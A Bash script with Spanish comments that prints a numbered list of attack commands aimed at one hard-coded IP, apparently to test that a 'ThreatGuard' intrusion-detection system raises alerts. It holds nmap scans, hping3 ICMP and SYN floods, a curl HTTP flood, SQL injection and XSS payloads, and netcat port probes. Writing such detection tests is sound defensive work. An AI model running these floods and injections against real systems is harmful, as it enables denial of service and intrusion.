#!/bin/bash
# Scripts de ataque para ejecutar desde Kali Linux
# Target: 98.84.174.81 (ThreatGuard EC2)

TARGET="98.84.174.81"

echo "=========================================="
echo "THREATGUARD - SCRIPTS DE PRUEBA DE ATAQUE"
echo "Target: $TARGET"
echo "=========================================="
echo ""
echo "Ejecuta estos comandos UNO POR UNO desde tu Kali Linux:"
echo ""

echo "# 1. PORT SCAN (SYN Scan) - Genera alerta MEDIA"
echo "sudo nmap -sS -p 1-1000 $TARGET"
echo ""

echo "# 2. ICMP FLOOD - Genera alerta ALTA"
echo "sudo hping3 -1 --flood -c 100 $TARGET"
echo ""

echo "# 3. SYN FLOOD - Genera alerta ALTA"
echo "sudo hping3 -S --flood -p 8080 -c 200 $TARGET"
echo ""

echo "# 4. HTTP FLOOD - Genera alerta ALTA"
echo "for i in {1..150}; do curl -s http://$TARGET:8080 > /dev/null & done; wait"
echo ""

echo "# 5. SQL INJECTION (HTTP) - Genera alerta ALTA"
echo "curl \"http://$TARGET:8080/search?q=admin' UNION SELECT * FROM users--\""
echo "curl \"http://$TARGET:8080/login?user=admin' OR 1=1--\""
echo ""

echo "# 6. XSS ATTACK (HTTP) - Genera alerta ALTA"
echo "curl \"http://$TARGET:8080/comment?text=<script>alert('XSS')</script>\""
echo "curl \"http://$TARGET:8080/profile?name=<img src=x onerror='alert(1)'>\""
echo ""

echo "# 7. SSH BRUTE FORCE - Genera alerta ALTA"
echo "for i in {1..10}; do timeout 1 nc -zv $TARGET 22; sleep 6; done"
echo ""

echo "# 8. PostgreSQL BRUTE FORCE - Genera alerta ALTA"
echo "for i in {1..10}; do timeout 1 nc -zv $TARGET 5432; sleep 6; done"
echo ""

echo "# 9. NMAP AGGRESSIVE SCAN - Genera múltiples alertas"
echo "sudo nmap -A -T4 $TARGET"
echo ""

echo "# 10. METASPLOIT PORT (simular) - Genera alerta ALTA"
echo "nc -zv $TARGET 4444"
echo ""

echo "=========================================="
echo "NOTA: Algunos comandos requieren 'sudo'"
echo "Instala herramientas si faltan:"
echo "  sudo apt update"
echo "  sudo apt install nmap hping3 netcat curl"
echo "=========================================="
